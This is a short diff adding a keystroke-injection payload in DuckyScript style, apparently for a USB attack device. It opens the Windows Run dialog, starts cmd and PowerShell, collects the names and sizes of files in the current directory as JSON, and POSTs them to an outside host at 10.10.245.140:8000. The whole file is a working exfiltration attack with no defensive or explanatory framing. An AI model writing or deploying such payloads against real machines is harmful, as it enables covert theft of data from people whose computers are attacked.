@@ -1,0 +1,8 @@
+GUI r
+STRING cmd
+ENTER
+STRING powershell
+ENTER
+STRING $files = dir | Select-Object Name, Length | ConvertTo-Json; Invoke-WebRequest -Uri http://10.10.245.140:8000 -Method POST -Body $files -ContentType 'application/json'
+ENTER
+
